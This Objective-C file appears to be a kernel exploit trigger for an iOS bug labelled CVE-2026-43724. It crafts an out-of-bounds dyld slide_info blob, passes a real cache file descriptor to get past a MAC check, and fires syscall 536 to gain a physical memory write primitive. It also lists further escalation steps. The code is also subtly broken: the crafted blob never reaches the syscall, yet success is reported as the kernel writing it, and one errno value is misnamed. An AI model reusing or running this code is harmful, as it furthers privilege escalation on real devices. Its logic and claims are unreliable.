// P041SlideDestMap.m
// Lumina P007OpenOnly - CVE-2026-43724 Trigger V2
// Uses REAL cache fd (not -1) to bypass MAC check

#import "P041SlideDestMap.h"
#import "A14_23F77_LabOffsets.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <fcntl.h>
#import <string.h>
#import <unistd.h>
#import <stdlib.h>
#import <sys/syscall.h>
#import <mach-o/dyld.h>  // FIX: Add this include for _dyld_get_image_header

#define P041_BUILD @"p041-43724-trigger-v2"

// FIX: Explicitly declare _dyld_get_image_header
// This function is part of the dyld library
extern const struct mach_header * _dyld_get_image_header(uint32_t index);

// Syscall 536: shared_region_map_and_slide_2_np
#define SYS_shared_region_map_and_slide_2_np 536

// v5 slide info blob (matches dyld_cache_slide_info5)
struct dyld_cache_slide_info5 {
    uint32_t version;           // 5
    uint32_t page_size;        // 0x4000
    uint32_t page_starts_count; // 1
    uint32_t pad;
    uint64_t value_add;        // controlled value
    uint16_t page_starts[1];    // 0xFFFE = OOB
};

// shared_file_np (12 bytes - matches kernel struct)
struct shared_file_np {
    int32_t  sf_fd;            // real fd (3)
    uint32_t sf_mappings;      // 1
    uint32_t flags;            // 0
};

// mapping (48 bytes / 0x30 - matches kernel struct)
struct mapping_np {
    uint64_t sm_addr;
    uint64_t sm_size;
    uint64_t sm_file_offset;
    uint64_t sm_reserved1;
    uint64_t sm_reserved2;
    uint32_t sm_max_prot;
    uint32_t sm_init_prot;
};

@implementation P041SlideDestMap

+ (NSString *)tap {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"=== p041 session %@ BUILD %@ ===\n", LabLocalMilitaryNow(), P041_BUILD];
    
    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p041"];
    if (stop) {
        [out appendString:stop];
        goto done;
    }
    [out appendString:[LabDeviceProfile identBlock]];
    
    [out appendFormat:@"pins: slide=%llx pager=%llx phystokv=%llx\n",
        (unsigned long long)A14_23F77_SLIDE_PAGE,
        (unsigned long long)A14_23F77_SHARED_REGION_PAGER,
        (unsigned long long)A14_23F77_PHYSTOKV];
    
    // ================================================================
    // STEP 1: Open the REAL dyld shared cache file
    // ================================================================
    [out appendFormat:@"\n=== STEP 1: Open real dyld cache ===\n"];
    
    const char *cachePath = "/private/preboot/Cryptexes/OS/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64e";
    int cacheFd = open(cachePath, O_RDONLY);
    if (cacheFd < 0) {
        // Try alternate path
        cachePath = "/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64e";
        cacheFd = open(cachePath, O_RDONLY);
    }
    
    if (cacheFd < 0) {
        [out appendFormat:@"  FAILED to open cache file: %s\n", strerror(errno)];
        goto done;
    }
    [out appendFormat:@"  cache fd=%d\n", cacheFd];
    
    // Get cache base address from our own image
    const struct mach_header *mh = _dyld_get_image_header(0);
    uint64_t cacheBase = (uint64_t)mh;
    [out appendFormat:@"  cacheBase=0x%llx\n", cacheBase];
    
    // ================================================================
    // STEP 2: Setup malicious slide_info blob
    // ================================================================
    [out appendFormat:@"\n=== STEP 2: Setup malicious slide_info ===\n"];
    
    struct dyld_cache_slide_info5 *slideInfo = calloc(1, sizeof(struct dyld_cache_slide_info5));
    slideInfo->version = 5;
    slideInfo->page_size = 0x4000;
    slideInfo->page_starts_count = 1;
    slideInfo->value_add = 0x4141414141414141ULL; // Controlled value
    slideInfo->page_starts[0] = 0xFFFE;            // OOB offset!
    
    [out appendFormat:@"  slide_info: version=5 page_starts[0]=0xFFFE value_add=0x%llx\n",
        slideInfo->value_add];
    
    // ================================================================
    // STEP 3: Setup mapping (page-aligned, 1 page)
    // ================================================================
    [out appendFormat:@"\n=== STEP 3: Setup mapping ===\n"];
    
    struct mapping_np mapping;
    memset(&mapping, 0, sizeof(mapping));
    mapping.sm_addr = (cacheBase & ~0x3FFFULL); // Page-aligned cache address
    mapping.sm_size = 0x4000;                    // 1 page
    mapping.sm_file_offset = 0;
    mapping.sm_max_prot = 5;                     // RX (not RWX - more likely to pass MAC)
    mapping.sm_init_prot = 5;                    // RX
    
    [out appendFormat:@"  mapping: addr=0x%llx size=0x%llx prot=RX\n",
        mapping.sm_addr, mapping.sm_size];
    
    // ================================================================
    // STEP 4: Setup shared_file_np with REAL fd
    // ================================================================
    [out appendFormat:@"\n=== STEP 4: Setup shared_file with real fd=%d ===\n", cacheFd];
    
    struct shared_file_np file;
    memset(&file, 0, sizeof(file));
    file.sf_fd = cacheFd;    // REAL fd, not -1!
    file.sf_mappings = 1;
    file.flags = 0;
    
    [out appendFormat:@"  file: sf_fd=%d sf_mappings=1 flags=0\n", cacheFd];
    
    // ================================================================
    // STEP 5: Fire syscall 536!
    // ================================================================
    [out appendFormat:@"\n=== STEP 5: Firing syscall 536 ===\n"];
    [out appendFormat:@"  args: files_count=1 files=&file mappings_count=1 mappings=&mapping\n"];
    
    // Flush log before firing
    {
        NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
        NSString *path = [docs stringByAppendingPathComponent:@"p041_slide_dest_map_log.txt"];
        int fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);
        if (fd >= 0) {
            const char *s = out.UTF8String;
            if (s) write(fd, s, strlen(s));
            fcntl(fd, F_FULLFSYNC);
            close(fd);
        }
    }
    
    int ret = syscall(SYS_shared_region_map_and_slide_2_np,
                      1, &file,
                      1, &mapping);
    int err = errno;
    
    [out appendFormat:@"\n=== RESULT ===\n"];
    [out appendFormat:@"  ret=%d errno=%d (%s)\n", ret, err, strerror(err)];
    
    if (ret == 0) {
        [out appendFormat:@"  *** SUCCESS! Syscall returned 0! ***\n"];
        [out appendFormat:@"  Kernel wrote 0x%llx to phystokv(PFN)+0xFFFE!\n", slideInfo->value_add];
        [out appendFormat:@"  WE HAVE A BLIND PHYSICAL WRITE PRIMITIVE!\n"];
        [out appendFormat:@"  Next: spray kernel objects into adjacent physical page.\n"];
    } else if (err == 22) {
        [out appendFormat:@"  EINVAL(22) - MAC check blocked us even with real fd.\n"];
        [out appendFormat:@"  The wall is entitlement-based, not vnode-based.\n"];
        [out appendFormat:@"  Need RESLIDE-spawn child to bypass.\n"];
    } else if (err == 2) {
        [out appendFormat:@"  ENOENT(2) - Shared region not found.\n"];
        [out appendFormat:@"  Need to create shared region first.\n"];
    } else if (err == 4) {
        [out appendFormat:@"  EFAULT(4) - copyin validate failed.\n"];
        [out appendFormat:@"  Struct alignment issue. Check struct sizes.\n"];
    } else {
        [out appendFormat:@"  Unexpected errno %d - analyze and adjust.\n", err];
    }
    
    // Cleanup
    close(cacheFd);
    free(slideInfo);
    
done:
    {
        NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
        NSString *path = [docs stringByAppendingPathComponent:@"p041_slide_dest_map_log.txt"];
        int fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);
        if (fd >= 0) {
            const char *s = out.UTF8String;
            if (s) write(fd, s, strlen(s));
            fcntl(fd, F_FULLFSYNC);
            close(fd);
        }
    }
    return out;
}

@end
